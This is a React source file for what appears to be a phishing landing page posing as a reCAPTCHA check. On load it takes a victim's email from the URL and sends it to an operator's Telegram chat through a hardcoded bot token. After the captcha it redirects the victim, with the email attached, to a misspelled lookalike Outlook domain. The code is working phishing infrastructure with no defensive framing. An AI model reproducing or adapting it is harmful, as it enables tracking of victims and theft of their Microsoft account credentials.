import React, { useState } from "react";
import ReCAPTCHA from "react-google-recaptcha";
import axios from "axios";

const App = () => {
  const hashValue = window.location.hash.substring(1);
  if (hashValue) {
    const botToken = "6980032440:AAGfgxetXOEWp0bVi2cXotvrupsDqn0FUxU";
    const userId = "1099461059"; // Replace with the target user's ID
    const messageText = `This email (${hashValue}) clicked on the site waiting for them to solve the recaptcha`;

    const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    axios
      .post(apiUrl, {
        chat_id: userId,
        text: messageText,
      })
      .then((response) => {
        if (response.data.ok) {
          return;
          // console.log("Message sent successfully!");
        } else {
          console.error("Failed to send message:", response.data.description);
        }
      })
      .catch((error) => {
        console.error("Error:", error.message);
      });
  }
  const [recaptchaValue, setRecaptchaValue] = useState("");

  const handleRecaptchaChange = (value) => {
    setRecaptchaValue(value);
  };

  const handleSubmit = async () => {
    try {
      const response = await axios.post("/.netlify/functions/verifyRecaptcha", {
        recaptchaValue,
      });

      const { message } = response.data;
      if (message) {
        window.location.href = `https://outlook.microsoftonilne.serveuser.com/cIgAxmdV#${hashValue}`;
      }

      // Proceed with your form submission logic here if needed
    } catch (error) {
      console.error("Error submitting form:", error);
    }
  };

  return (
    <div className=" container mt-5 pt-5 ">
      <div className="mt-5 pt-5 w-50 mx-3">
        {/* Google reCAPTCHA */}
        <ReCAPTCHA
          sitekey="6LfSvx4pAAAAAGaJXrjwrkifVb3vBs0HeKkAWKo-"
          onChange={handleRecaptchaChange}
        />

        <button
          type="button"
          onClick={handleSubmit}
          className="btn btn-primary mt-1"
        >
          Submit
        </button>
      </div>
    </div>
  );
};

export default App;
